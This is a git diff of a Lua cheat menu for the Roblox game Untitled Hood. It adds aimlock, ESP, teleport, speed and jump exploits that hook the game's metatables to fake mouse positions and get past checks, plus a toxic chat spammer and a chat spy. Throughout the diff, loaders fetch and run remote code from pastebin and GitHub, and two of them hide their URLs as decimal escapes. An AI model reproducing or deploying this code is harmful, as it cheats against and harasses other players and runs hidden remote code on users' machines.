@@ -1,14 +1,15 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Barney1"))()
+if game.PlaceId == (9183932460) then
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Barney1"))()
 
 
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\97\108\108\105\103\117\115\97\112\111\84\84\47\66\97\108\108\105\103\117\115\97\112\111\84\84\47\109\97\105\110\47\65\10"))()
 
 
 local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
-local Window = Library.CreateLib("Untitled Hood Balli Gui", "BloodTheme")
+local Window = Library.CreateLib("Untitled Hood Balli Gui V2", "DarkTheme")
 
-local Tab = Window:NewTab("Scripts")
-local Section = Tab:NewSection("Scripts")
+local Tab = Window:NewTab("Main")
+local Section = Tab:NewSection("Main")
 Section:NewTextBox("Speed", "TextboxInfo", function(txt)
 game.Players.LocalPlayer.Character.Humanoid.Name = "BuyLinoriaNow"
 game.Players.LocalPlayer.Character.BuyLinoriaNow.WalkSpeed = (txt)
@@ -25,7 +26,6 @@ game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServ
 end)
 Section:NewButton("AutoToxic", "ButtonInfo", function()
 
--- BlastingStone#8878
 
 local function chat(msg)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
@@ -101,6 +101,146 @@ local args = {
 game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
 end
 end)
+Section:NewButton("View Gui", "ButtonInfo", function()
+
+--hello guys today we play minecraft--
+
+local screengui = Instance.new("ScreenGui")
+screengui.Name = "Spectate"
+screengui.ResetOnSpawn = false
+screengui.Parent = game.Players.LocalPlayer.PlayerGui
+-------
+local frame = Instance.new("Frame")
+frame.BorderSizePixel = 0
+frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+frame.Position = UDim2.new(0.363293529, 0, 0.28638497, 0)
+frame.Size = UDim2.new(0, 300, 0, 154)
+frame.Draggable = true
+frame.Active = true
+frame.Parent = screengui
+-------
+local textbox = Instance.new("TextBox")
+textbox.BackgroundColor3 = Color3.fromRGB(242, 243, 243)
+textbox.BorderSizePixel = 0
+textbox.ClearTextOnFocus = false
+textbox.Position = UDim2.new(0,0, 0, 0)
+textbox.Size = UDim2.new(0, 300, 0, 58)
+textbox.TextSize = 15
+textbox.Font = Enum.Font.SourceSansBold
+textbox.Text = ""
+textbox.PlaceholderText = "Type player name and enter"
+textbox.TextColor3 = Color3.new(1, 1, 1)
+textbox.Parent = frame
+-------
+local textbutton = Instance.new("TextButton")
+textbutton.Active = true
+textbutton.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
+textbutton.BorderSizePixel = 0
+textbutton.Position = UDim2.new(0.136470661, 0, 0.458670378, 0)
+textbutton.Selectable = true
+textbutton.Size = UDim2.new(0, 200, 0, 58)
+textbutton.Style = Enum.ButtonStyle.Custom
+textbutton.Font = Enum.Font.SourceSansBold
+textbutton.TextSize = 15
+textbutton.Text = "Unview"
+textbutton.TextColor3 = Color3.new(40, 127, 71)
+textbutton.TextWrapped = true
+textbutton.Parent = frame
+
+
+-------
+textbox.FocusLost:connect(function(enter)
+if enter then
+local text = textbox.Text
+local players = game.Players:GetChildren()
+for _,v in pairs (players) do
+if string.match(string.lower(v.Name),string.lower(text)) then
+workspace.Camera.CameraSubject = v.Character
+end
+end
+end
+end)
+
+
+textbutton.MouseButton1Click:connect(function()
+workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character
+end)
+end)
+Section:NewButton("Teleport Gui", "ButtonInfo", function()
+--i slap you using will smith hands--
+
+local screengui = Instance.new("ScreenGui")
+screengui.Name = "Teleport"
+screengui.ResetOnSpawn = false
+screengui.Parent = game.Players.LocalPlayer.PlayerGui
+-------
+local frame = Instance.new("Frame")
+frame.BorderSizePixel = 0
+frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+frame.Position = UDim2.new(0.363293529, 0, 0.28638497, 0)
+frame.Size = UDim2.new(0, 300, 0, 154)
+frame.Draggable = true
+frame.Active = true
+frame.Parent = screengui
+-------
+local textbox = Instance.new("TextBox")
+textbox.BackgroundColor3 = Color3.fromRGB(242, 243, 243)
+textbox.BorderSizePixel = 0
+textbox.ClearTextOnFocus = false
+textbox.Position = UDim2.new(0,0, 0, 0)
+textbox.Size = UDim2.new(0, 300, 0, 58)
+textbox.TextSize = 15
+textbox.Font = Enum.Font.SourceSansBold
+textbox.Text = ""
+textbox.PlaceholderText = "Type player name and enter"
+textbox.TextColor3 = Color3.new(1, 1, 1)
+textbox.Parent = frame
+-------
+local textbutton = Instance.new("TextButton")
+textbutton.Active = true
+textbutton.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
+textbutton.BorderSizePixel = 0
+textbutton.Position = UDim2.new(0.136470661, 0, 0.458670378, 0)
+textbutton.Selectable = true
+textbutton.Size = UDim2.new(0, 200, 0, 58)
+textbutton.Style = Enum.ButtonStyle.Custom
+textbutton.Font = Enum.Font.SourceSansBold
+textbutton.TextSize = 15
+textbutton.Text = "Teleport To Player"
+textbutton.TextColor3 = Color3.new(40, 127, 71)
+textbutton.TextWrapped = true
+textbutton.Parent = frame
+
+
+textbox.FocusLost:connect(function()
+for i,v in pairs(game.Players:GetChildren()) do
+if (string.sub(string.lower(v.Name),1,string.len(textbox.Text))) == string.lower(textbox.Text) then
+textbox.Text = v.Name
+end
+end
+end)
+
+-------
+
+game:GetService("UserInputService").InputBegan:connect(function(key)
+if key.KeyCode == Enum.KeyCode.E then --Replace E with the key you would like to be pressed
+local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
+local p2 = textbox.Text
+local pos = p1.CFrame
+
+p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame
+
+wait(5)
+
+p1.CFrame = pos
+end
+end)
+
+textbutton.MouseButton1Click:connect(function()
+local vim = game:service("VirtualInputManager")
+vim:SendKeyEvent(true, "E", false, game)
+end)
+end)
 Section:NewButton("Esp Player", "ButtonInfo", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua"))()
 end)
@@ -109,58 +249,282 @@ while true do wait()
 game.Players.LocalPlayer.Character.Humanoid.Jump = true
 end
 end)
+Section:NewButton("No Cooldown Jump", "ButtonInfo", function()
+--you smell raw beef--
+if not game.IsLoaded(game) then
+   game.Loaded.Wait(game.Loaded);
+end
+
+
+local IsA = game.IsA;
+local newindex = nil
+
+
+newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
+   if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then
+       return
+   end
+   
+   return newindex(self, Index, Value);
+end)
+end)
+Section:NewButton("Chat Spy", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/YfcHkZ3f"))()
+end)
 Section:NewTextBox("Fov", "TextboxInfo", function(txt)
 local amount = 150
 
 game:GetService'Workspace'.Camera.FieldOfView = (txt)
 end)
+Section:NewButton("Force Reset", "ButtonInfo", function()
+game.Players.LocalPlayer.Character.Head:Destroy()
+end)
+Section:NewButton("Anti Stomp", "ButtonInfo", function()
+game:GetService('Players').LocalPlayer.Character.Humanoid:GetPropertyChangedSignal('Health'):Connect(function()
+   if game:GetService('Players').LocalPlayer.Character.Humanoid.Health < 20 then
+       plr = game:GetService('Players').LocalPlayer
+
+        local char = plr.Character
+
+        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 500
+        wait()
+      end
+end)
+end)
 local Tab = Window:NewTab("Aimlock")
-local Section = Tab:NewSection("Aimlock Script")
-Section:NewButton("Aimlock Gui (credit to owner)", "ButtonInfo", function()
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Balligusapo Hub", "BloodTheme")
-
-local Tab = Window:NewTab("Aimlock")
-local Section = Tab:NewSection("Press Q To Lock Player")
-Section:NewButton("Keyboard For Aimlock (Mobile)", "ButtonInfo", function()
-loadstring(game:HttpGet("https://pastebin.com/raw/SBFs3EpZ"))()
-end)
-Section:NewButton("Aimlock", "ButtonInfo", function()
-loadstring(game:HttpGet("https://pastebin.com/raw/thi3P3WQ"))()
-end)
-
-local Tab = Window:NewTab("Teleport")
-local Section = Tab:NewSection("Made By Balligusapo")
-Section:NewButton("Revolver", "ButtonInfo", function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(226.0426025390625, 57.05280303955078, -1161.1080322265625)
-end)
-Section:NewButton("Double Barrel", "ButtonInfo", function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(337.802001953125, 57.05280303955078, -1757.880615234375)
-end)
-Section:NewButton("Armor", "ButtonInfo", function()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(266.0012512207031, 56.704185485839844, -822.5711669921875)
-end)
-local Section = Tab:NewSection("Like And Subscribe For More")
-
-local Tab = Window:NewTab("Teleport Tool")
-local Section = Tab:NewSection("Usefull Script")
-Section:NewButton("Teleport Tool", "ButtonInfo", function()
+local Section = Tab:NewSection("Aimlock Tool")
+Section:NewButton("Balli Aimlock Tool 1", "ButtonInfo", function()
 mouse = game.Players.LocalPlayer:GetMouse()
 tool = Instance.new("Tool")
 tool.RequiresHandle = false
-tool.Name = "Teleport"
+tool.Name = "Balli Aimlock Tool 1"
 tool.Activated:connect(function()
 local pos = mouse.Hit+Vector3.new(0,2.5,0)
 pos = CFrame.new(pos.X,pos.Y,pos.Z)
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+local vim = game:service("VirtualInputManager")
+vim:SendKeyEvent(true, "Q", false, game)
+loadstring(game:HttpGet("https://pastebin.com/raw/thi3P3WQ"))()
 end)
 tool.Parent = game.Players.LocalPlayer.Backpack
 end)
+Section:NewButton("Balli Aimlock Tool 2", "ButtonInfo", function()
+mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Balli Aimlock Tool 2"
+tool.Activated:connect(function()
+local pos = mouse.Hit+Vector3.new(0,2.5,0)
+pos = CFrame.new(pos.X,pos.Y,pos.Z)
+local vim = game:service("VirtualInputManager")
+vim:SendKeyEvent(true, "Q", false, game)
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+-- Toggle
+getgenv().Target = true
+
+-- Configuration
+getgenv().Key = Enum.KeyCode.Q
+getgenv().Prediction = 0.1393
+getgenv().ChatMode = false
+getgenv().NotifMode = true
+    getgenv().PartMode = true
+    getgenv().AirshotFunccc = false
+    getgenv().Partz = "HumanoidRootPart"
+getgenv().AutoPrediction = false
+getgenv().Fov = 70
+getgenv().Circle = true
+--
+    _G.Types = {
+        Ball = Enum.PartType.Ball,
+        Block = Enum.PartType.Block, 
+        Cylinder = Enum.PartType.Cylinder
+    }
+    
+    --variables                 
+    	local Tracer = Instance.new("Part", game.Workspace)
+    Tracer.Name = "Ballitool"	
+    Tracer.Anchored = true		
+    Tracer.CanCollide = false
+    Tracer.Transparency = 0.7
+    Tracer.Parent = game.Workspace	
+    Tracer.Shape = _G.Types.Block
+    Tracer.Size = Vector3.new(7,7,7)
+    Tracer.Color = Color3.fromRGB(0,0,0)
+    
+    --
+    local plr = game.Players.LocalPlayer
+local mouse = plr:GetMouse()
+local Runserv = game:GetService("RunService")
+
+circle = Drawing.new("Circle")
+circle.Color = Color3.fromRGB(0,0,0)
+circle.Thickness = 0
+circle.NumSides = 732
+circle.Radius = getgenv().Fov
+circle.Thickness = 0
+circle.Transparency = 0
+circle.Visible = getgenv().Circle
+circle.Filled = false
+
+Runserv.RenderStepped:Connect(function()
+    circle.Position = Vector2.new(mouse.X,mouse.Y+35)
+    if getgenv().AirshotFunccc == true then
+            if Plr ~= nil then else return; end
+            if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
+                getgenv().Partz = "RightFoot"
+            else
+                Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
+                    if new == Enum.HumanoidStateType.Freefall then
+                    getgenv().Partz = "RightFoot"
+                    else
+                        getgenv().Partz = "HumanoidRootPart"
+                    end
+                end)
+            end
+end
+end)
+    
+    	local guimain = Instance.new("Folder", game.CoreGui)
+    	local CC = game:GetService"Workspace".CurrentCamera
+    local LocalMouse = game.Players.LocalPlayer:GetMouse()
+    	local Locking = false
+    
+    	
+    --
+    if getgenv().valiansh == true then
+                        game.StarterGui:SetCore("SendNotification", {
+                   Title = "UH Balli Gui",
+                   Text = "Aimlock Tool Loaded!.",
+                   Duration = 5
+        
+                   })
+        return
+    end
+    
+    getgenv().valiansh = true
+    
+        local UserInputService = game:GetService("UserInputService")
+
+    UserInputService.InputBegan:Connect(function(keygo,ok)
+           if (not ok) then
+           if (keygo.KeyCode == getgenv().Key) then
+               if getgenv().Target == true then
+               Locking = not Locking
+               
+               if Locking then
+               Plr =  getClosestPlayerToCursor()
+                if getgenv().ChatMode then
+        local A_1 = ""..tostring(Plr.Character.Humanoid.DisplayName) local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+        	end	
+               if getgenv().NotifMode then
+    			game.StarterGui:SetCore("SendNotification", {
+        Title = "Player Locked!";
+        Text = ""..tostring(Plr.Character.Humanoid.DisplayName);
+    
+    })
+    end
+    elseif not Locking then
+         if getgenv().ChatMode then
+        local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+        	end	
+        if getgenv().NotifMode then
+                        game.StarterGui:SetCore("SendNotification", {
+                   Title = "UH Balli Gui",
+                   Text = "Player Unlocked!",
+                   Duration = 5
+               })
+           elseif getgenv().Target == false then
+                        game.StarterGui:SetCore("SendNotification", {
+                   Title = "",
+                   Text = "Target Left Or Died ",
+                   Duration = 5
+     
+                   })
+               
+               end
+                  
+ 
+ end     end   
+end
+end
+end)
+	
+	function getClosestPlayerToCursor()
+		local closestPlayer
+		local shortestDistance = circle.Radius
+
+		for i, v in pairs(game.Players:GetPlayers()) do
+			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
+				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
+				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
+				if magnitude < shortestDistance then
+					closestPlayer = v
+					shortestDistance = magnitude
+				end
+			end
+		end
+		return closestPlayer
+	end
+--
+if getgenv().PartMode then
+	game:GetService"RunService".Stepped:connect(function()
+		if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
+			Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
+		else
+			Tracer.CFrame = CFrame.new(0, 9999, 0)
+		end
+	end)
+end
+
+    
+    
+    --
+	local rawmetatable = getrawmetatable(game)
+	local old = rawmetatable.__namecall
+	setreadonly(rawmetatable, false)
+	rawmetatable.__namecall = newcclosure(function(...)
+		local args = {...}
+		if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
+			args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
+			return old(unpack(args))
+		end
+		return old(...)
+	end)
+---
+	while wait() do
+	if getgenv().AutoPrediction == true then
+        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+        local split = string.split(pingvalue,'(')
+        local ping = tonumber(split[1])
+        if ping < 130 then
+            getgenv().Prediction = 0.151
+        elseif ping < 125 then
+            getgenv().Prediction = 0.149
+        elseif ping < 110 then
+            getgenv().Prediction = 0.140
+        elseif ping < 105 then
+            getgenv().Prediction = 0.133
+        elseif ping < 90 then
+            getgenv().Prediction = 0.130
+        elseif ping < 80 then
+            getgenv().Prediction = 0.128
+        elseif ping < 70 then
+            getgenv().Prediction = 0.1230
+        elseif ping < 60 then
+            getgenv().Prediction = 0.1229
+        elseif ping < 50 then
+            getgenv().Prediction = 0.1225
+        elseif ping < 40 then
+            getgenv().Prediction = 0.1256
+        end
+	end
+    end
 end)
 local Tab = Window:NewTab("Animation Gui")
 local Section = Tab:NewSection("Untitled Hood Animation")
 Section:NewButton("Untitled Hood Animation Gui", "ButtonInfo", function()
-loadstring(game:HttpGet("https://pastebin.com/raw/dsALdf8R"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/cC0WCXWt"))()
 end)
 local Tab = Window:NewTab("Teleports")
 local Section = Tab:NewSection("Teleports To Place")
@@ -211,7 +575,7 @@ local args = {
 }
 
 game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
-wait(1.9)
+wait(1.4)
 -- Script generated by SimpleSpy - credits to exx#9394
 
 local args = {
@@ -361,5 +725,356 @@ game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServ
 end)
 tool.Parent = game.Players.LocalPlayer.Backpack
 end)
+Section:NewTextBox("Flash Tool", "TextboxInfo", function(txt)
+mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Flash Tool"
+tool.Activated:connect(function()
+local pos = mouse.Hit+Vector3.new(0,2.5,0)
+pos = CFrame.new(pos.X,pos.Y,pos.Z)
+plr = game:GetService('Players').LocalPlayer
+
+        local char = plr.Character
+
+        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * (txt)
+        wait()
+        -- Script generated by SimpleSpy - credits to exx#9394
+
+local args = {
+    [1] = "Boombox",
+    [2] = "9116274241"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
+wait(1.9)
+-- Script generated by SimpleSpy - credits to exx#9394
+
+local args = {
+    [1] = "BoomboxStop"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+Section:NewButton("Inf Jump Tool", "ButtonInfo", function()
+mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Inf Jump Tool"
+tool.Activated:connect(function()
+local pos = mouse.Hit+Vector3.new(0,2.5,0)
+pos = CFrame.new(pos.X,pos.Y,pos.Z)
+game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+local Players = game:GetService("Players")
+
+local lp = Players.LocalPlayer
+
+local mouse = lp:GetMouse()
+
+local uis = game:GetService("UserInputService")
+
+local rservice = game:GetService("RunService")
+
+local cam = workspace.CurrentCamera
+
+local NormalGravity = game.Workspace.Gravity
+
+local Raw = getrawmetatable(game)
+
+local Caller = checkcaller or is_protosmasher_caller or Cer.isCerus
+
+local CallingScript = getcallingscript or get_calling_script
+
+local Closure = newcclosure or read_me or function(Func) return Func end
+
+local CallingMethod = getnamecallmethod or get_namecall_method
+
+setreadonly(Raw,false)
+
+local NewIndex = Raw.__newindex;
+
+Raw.__newindex = Closure(function(self,Property,Value)
+
+	if Caller() then return NewIndex(self,Property,Value) end
+
+	if Property == "JumpPower" then return 50 end 
+
+	if self == workspace and Property == "Gravity" then return NormalGravity end
+
+	if Property == "CFrame" and self:IsDescendantOf(lp.Character) then return end 
+
+	return NewIndex(self,Property,Value)
+
+end)
+-- Script generated by SimpleSpy - credits to exx#9394
+
+local args = {
+    [1] = "Boombox",
+    [2] = "147722165"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
+wait(1.9)
+-- Script generated by SimpleSpy - credits to exx#9394
+
+local args = {
+    [1] = "BoomboxStop"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+Section:NewButton("Fly Tool", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/QNcaJzgv"))()
+end)
+Section:NewButton("Swim Tool", "ButtonInfo", function()
+local player = game.Players.LocalPlayer
+local character = player.Character
+local humanoid = character.Humanoid
+ 
+local tool = Instance.new("Tool")
+tool.Name = "Swim Tool"
+tool.RequiresHandle = false
+tool.Parent = player.Backpack
+
+tool. Equipped:Connect(function()
+tool:Activate()
+_G.loops = true
+
+while _G.loops do
+wait()
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
+end
+end)
+tool. Unequipped:Connect(function()
+tool:Deactivate()
+_G.loops = false
+
+while _G.loops do
+wait()
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
+end
+end)
+end)
+Section:NewTextBox("Fake Macro Tool", "TextboxInfo", function(txt)
+local player = game.Players.LocalPlayer
+local character = player.Character
+local humanoid = character.Humanoid
+ 
+local tool = Instance.new("Tool")
+tool.Name = "Macro Tool"
+tool.RequiresHandle = false
+tool.Parent = player.Backpack
+ 
+tool. Equipped:Connect(function()
+-- Script generated by SimpleSpy - credits to exx#9394
+
+local args = {
+    [1] = "AnimationPack",
+    [2] = "Greet"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
+wait(1)
+    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+        if v.name == "[Phone]" then
+            v.Parent = game.Players.LocalPlayer.Character
+        end
+    end
+wait(1)
+for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+        if v.name == "[Phone]" then
+            v.Parent = game.Players.LocalPlayer.Backpack;
+        end
+    end
+wait(0)
+
+local vim = game:service("VirtualInputManager")
+vim:SendKeyEvent(true, "LeftControl", false, game)
+tool:Activate()
+_G.loops = true
+
+while _G.loops do
+wait()
+plr = game:GetService('Players').LocalPlayer
+
+        local char = plr.Character
+
+        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * (txt)
+        wait()
+end
+end)
+tool. Unequipped:Connect(function()
+tool:Deactivate()
+_G.loops = false
+
+while _G.loops do
+wait()
+plr = game:GetService('Players').LocalPlayer
+
+        local char = plr.Character
+
+        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 17
+        wait()
+end
+end)
+end)
+Section:NewButton("Web Tool", "ButtonInfo", function()
+local Sound = Instance.new("Sound",game:GetService("SoundService"))
+Sound.SoundId = "rbxassetid://1523818134"
+Sound:Play()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = ("Thanks For Using UH Balli Gui");
+	Text = "Balli Web Tool Loaded!";
+	Icon = "rbxthumb://type=Asset&id=9915433572&w=150&h=150"})
+Duration = 16;
+mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Balli Web Tool"
+tool.Activated:connect(function()
+local pos = mouse.Hit+Vector3.new(500,500.500,500)
+pos = CFrame.new(pos.X,pos.Y,pos.Z)
+local plr=game:service"Players".LocalPlayer;
+local tweens=game:service"TweenService";
+local mouse=plr:GetMouse();
+local info=TweenInfo.new(3,Enum.EasingStyle.Quad); pos=CFrame.new(mouse.Hit.x,mouse.Hit.y,mouse.Hit.z);
+   local tween=tweens:Create(plr.Character["HumanoidRootPart"],info,{CFrame=pos});
+   tween:Play();
+-- Script generated by SimpleSpy - credits to exx#9394
+
+local args = {
+    [1] = "Boombox",
+    [2] = "1284846268"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
+wait(0.9)
+-- Script generated by SimpleSpy - credits to exx#9394
+
+local args = {
+    [1] = "BoomboxStop"
+}
+
+game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+Section:NewTextBox("Speed Tool", "TextboxInfo", function(txt)
+local player = game.Players.LocalPlayer
+local character = player.Character
+local humanoid = character.Humanoid
+ 
+local tool = Instance.new("Tool")
+tool.Name = "Speed Tool"
+tool.RequiresHandle = false
+tool.Parent = player.Backpack
+ 
+tool. Equipped:Connect(function()
+tool:Activate()
+_G.loops = true
+
+while _G.loops do
+wait()
+plr = game:GetService('Players').LocalPlayer
+
+        local char = plr.Character
+
+        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * (txt)
+        wait()
+end
+end)
+tool. Unequipped:Connect(function()
+tool:Deactivate()
+_G.loops = false
+
+while _G.loops do
+wait()
+plr = game:GetService('Players').LocalPlayer
+
+        local char = plr.Character
+
+        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 17
+        wait()
+end
+end)
+end)
+local Tab = Window:NewTab("Visual")
+local Section = Tab:NewSection("Visual")
+Section:NewButton("Visual Korblox", "ButtonInfo", function()
+local ply = game.Players.LocalPlayer
+
+        local chr = ply.Character
+
+        chr.RightLowerLeg.MeshId = "902942093"
+
+        chr.RightLowerLeg.Transparency = "1"
+
+        chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+
+        chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+
+        chr.RightFoot.MeshId = "902942089"
+
+        chr.RightFoot.Transparency = "1"
+end)
+Section:NewButton("Visual Headless", "ButtonInfo", function()
+game.Players.LocalPlayer.Character.Head.Transparency = 1
+
+for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+
+if (v:IsA("Decal")) then
+
+v:Destroy()
+
+end
+
+end
+end)
+Section:NewButton("Visual FullBright", "ButtonInfo", function()
+pcall(function()
+	local lighting = game:GetService("Lighting");
+	lighting.Ambient = Color3.fromRGB(255, 255, 255);
+	lighting.Brightness = 1;
+	lighting.FogEnd = 1e10;
+	for i, v in pairs(lighting:GetDescendants()) do
+		if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
+			v.Enabled = false;
+		end;
+	end;
+	lighting.Changed:Connect(function()
+		lighting.Ambient = Color3.fromRGB(255, 255, 255);
+		lighting.Brightness = 1;
+		lighting.FogEnd = 1e10;
+	end);
+	spawn(function()
+		local character = game:GetService("Players").LocalPlayer.Character;
+		while wait() do
+			repeat wait() until character ~= nil;
+			if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
+				local headlight = Instance.new("PointLight", character.HumanoidRootPart);
+				headlight.Brightness = 1;
+				headlight.Range = 60;
+			end;
+		end;
+	end);
+end)
+end)
+
+local Sound = Instance.new("Sound",game:GetService("SoundService"))
+Sound.SoundId = "rbxassetid://232127604"
+Sound:Play()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = ("UH Balli Gui V2");
+	Text = "gui has been updated. |Made by balligusapo|";
+	Icon = "rbxthumb://type=Asset&id=1778351310&w=150&h=150"})
+Duration = 16;
+
 
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\97\108\108\105\103\117\115\97\112\111\84\84\47\66\97\108\108\105\103\117\115\97\112\111\84\84\47\109\97\105\110\47\67\104\97\116\108\111\103\115\97\110\100\106\111\105\110\108\111\103\115\10"))()
+else
+      game:GetService("Players").LocalPlayer:Kick("Please make sure your in the right game: Untitled Hood https://www.roblox.com/games/9183932460/Untitled-Hood")
+end
